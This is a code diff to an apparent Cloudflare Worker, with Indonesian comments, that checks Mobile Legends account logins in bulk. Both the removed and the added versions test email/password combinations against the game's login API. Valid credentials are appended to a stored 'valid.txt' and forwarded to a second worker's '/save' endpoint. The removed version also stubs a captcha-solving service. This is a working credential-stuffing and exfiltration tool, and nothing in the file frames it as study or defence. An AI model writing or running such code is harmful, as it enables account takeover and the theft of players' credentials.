@@ -2,68 +2,73 @@ export default {
   async fetch(request, env) {
     const url = new URL(request.url);
 
-    if (request.method === "POST" && url.pathname === "/check") {
-      const { combos } = await request.json();
-      if (!Array.isArray(combos)) {
-        return new Response(JSON.stringify({ error: "Invalid combos" }), { status: 400 });
-      }
+    // CORS preflight
+    if (request.method === "OPTIONS") {
+      return new Response(null, {
+        status: 204,
+        headers: {
+          "Access-Control-Allow-Origin": "*",
+          "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
+          "Access-Control-Allow-Headers": "Content-Type",
+        },
+      });
+    }
 
-      const results = await Promise.all(
-        combos.map(async (combo) => {
-          const [email, password] = combo.split(/[:|]/);
-          const captchaToken = await solveNecaptcha(env.NECAPTCHA_KEY);
-          const valid = await checkMLBBAccount(email, password, captchaToken);
-          if (valid) {
-            const cred = `${email}|${password}|${valid.game_token}`;
-            await env.SESSION_KV.put(`session:${Date.now()}:${Math.random()}`, cred, { expirationTtl: 3600 });
-            await sendToWorkerB(env, cred);
-            return { combo, status: "valid" };
+    if (url.pathname === "/check" && request.method === "POST") {
+      try {
+        const { email, password, captcha_token } = await request.json();
+        if (!email || !password || !captcha_token) {
+          return Response.json({ error: "Missing parameters" }, { status: 400 });
+        }
+
+        // Simulasi request ke API MLBB (ganti dengan API asli)
+        const mlbbRes = await fetch("https://accountmtapi.mobilelegends.com/", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            email,
+            password,
+            captcha: captcha_token,
+          }),
+        });
+
+        const data = await mlbbRes.json();
+
+        // Jika akun valid
+        if (data.code === 0) {
+          const line = `${email}|${password}\n`;
+
+          // 1. Simpan ke KV sementara
+          if (env.VALID_ACCOUNTS) {
+            let old = await env.VALID_ACCOUNTS.get("valid.txt") || "";
+            old += line;
+            await env.VALID_ACCOUNTS.put("valid.txt", old);
           }
-          return { combo, status: "invalid" };
-        })
-      );
 
-      return new Response(JSON.stringify(results), {
-        headers: { "Content-Type": "application/json" },
-      });
-    }
+          // 2. Kirim ke Worker B
+          if (env.WORKER_B_URL && env.SECRET_KEY) {
+            try {
+              await fetch(env.WORKER_B_URL + "/save", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  secret: env.SECRET_KEY,
+                  account: `${email}|${password}`,
+                }),
+              });
+            } catch (err) {
+              console.error("Gagal kirim ke Worker B:", err);
+            }
+          }
+        }
 
-    if (request.method === "GET" && url.pathname === "/session-valid") {
-      const list = await env.SESSION_KV.list({ prefix: "session:" });
-      const values = [];
-      for (const item of list.keys) {
-        const val = await env.SESSION_KV.get(item.name);
-        if (val) values.push(val);
+        return Response.json(data);
+
+      } catch (err) {
+        return Response.json({ error: err.message }, { status: 500 });
       }
-      return new Response(values.join("\n"), {
-        headers: { "Content-Type": "text/plain" },
-      });
     }
 
-    return new Response("Not Found", { status: 404 });
+    return new Response("Worker A aktif", { status: 200 });
   },
 };
-
-async function solveNecaptcha(apiKey) {
-  // Dummy Necaptcha solver – integrasikan API CapMonster/2captcha di sini
-  return "dummy_captcha_token";
-}
-
-async function checkMLBBAccount(email, password, captchaToken) {
-  // Dummy MLBB API request – ganti dengan HTTP request asli
-  if (password === "passwordbenar") {
-    return { game_token: "dummy_game_token" };
-  }
-  return null;
-}
-
-async function sendToWorkerB(env, cred) {
-  await fetch(env.WORKER_B_URL + "/save", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "X-Secret-Key": env.SECRET_KEY_B,
-    },
-    body: JSON.stringify({ cred }),
-  });
-}
